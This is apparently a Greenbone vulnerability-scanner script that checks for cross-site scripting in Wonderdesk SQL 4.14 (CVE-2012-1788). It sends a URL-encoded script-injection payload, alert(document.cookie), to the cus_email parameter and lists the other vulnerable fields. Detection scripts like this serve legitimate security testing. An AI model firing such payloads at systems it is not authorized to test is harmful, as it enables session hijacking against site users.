# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803625");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2012-1788");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-06-03 15:30:38 +0530 (Mon, 03 Jun 2013)");
  script_name("Wonderdesk SQL Multiple Cross-Site Scripting (XSS) Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48167");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52193");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73502");
  script_xref(name:"URL", value:"http://st2tea.blogspot.in/2012/02/wonderdesk-cross-site-scripting.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/110224/WonderDesk-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a users browser session in context of an
  affected site and launch other attacks.");

  script_tag(name:"affected", value:"Wonderdesk version 4.14, other versions may also be affected");

  script_tag(name:"insight", value:"Multiple flaws due to:

  - Improper sanitization of 'cus_email' parameter to wonderdesk.cgi when 'do'
  is set to 'cust_lostpw'.

  - Improper sanitization of 'help_name', 'help_email', 'help_website', and
  'help_example_url' parameters to wonderdesk.cgi when 'do' is set to
  'hd_modify_record'.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Wonderdesk SQL is prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/wonderdesk", "/helpdesk", http_cgi_dirs(port:port))){

  if( dir == "/" ) dir = "";

  sndReq = http_get(item:string(dir, "/wonderdesk.cgi"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if(rcvRes && ('>Help Desk' >< rcvRes && "WonderDesk SQL" >< rcvRes ))
  {
    postdata = "do=cust_lostpw&cus_email=%22%3Cscript%3Ealert%28" +
               "document.cookie%29%3C%2Fscript%3E&Submit=Submit";

    req = string("POST ", dir, "/wonderdesk.cgi HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res)
    {
      security_message(port);
      exit(0);
    }
  }
}

exit(99);
